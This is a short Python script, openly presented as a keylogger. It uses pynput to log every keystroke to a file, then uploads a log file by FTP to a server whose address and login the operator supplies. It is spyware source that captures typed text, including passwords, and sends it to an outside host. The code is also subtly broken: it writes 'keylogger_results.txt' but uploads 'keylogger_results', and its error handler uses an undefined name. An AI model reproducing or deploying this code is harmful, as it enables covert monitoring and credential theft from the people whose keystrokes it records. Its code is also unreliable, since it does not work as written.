from pynput.keyboard import Key, Listener
import ftplib
import logging

logdir = ""

server_ip = raw_input("Enter the FTP server IP: ")
username = raw_input("Enter the FTP server username: ")
password = raw_input("Enter the FTP server password: ")

logging.basicConfig(filename=(logdir+"keylogger_results.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")
def pressing_key(Key):
    try:
        logging.info(str(Key))
    except AttributeError:
        print("A special key {0} has been pressed.".format(key))

def releasing_key(key):
    if key == Key.esc:
        return False
    
print("\n[KEYLOGGER]: Capturing keystrokes...\n")

with Listener(on_press=pressing_key, on_release=releasing_key) as listener:
    listener.join()

print("\n[KEYLOGGER]: Connected to FTP Server\n")
print("\n[KEYLOGGER]: Sending the data to FTP Server\n")

sess = ftplib.FTP(server_ip, username, password)
file = open("keylogger_results", "rb")
sess.storbinary("STOR keylogger_results", file)
file.close()
sess.quit()